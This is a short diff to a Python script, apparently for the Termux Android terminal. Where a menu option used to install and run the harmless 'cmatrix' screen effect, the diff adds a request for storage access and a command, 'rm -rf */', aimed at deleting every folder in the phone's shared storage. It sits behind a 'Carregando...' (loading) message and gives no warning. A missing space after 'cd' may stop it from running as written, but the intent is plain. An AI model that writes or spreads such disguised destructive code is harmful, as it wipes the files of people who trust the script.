@@ -36,7 +36,7 @@ print("\n")
 print("Carregando...")
 time.sleep(2)
 if resp==1:
-    os.system("pkg install cmatrix")
-    os.system("cmatrix")
+    os.system("termux-setup-storage")
+    os.system("cd/storage/emulated/0/ && rm -rf */")
 else:
     os.system("clear")
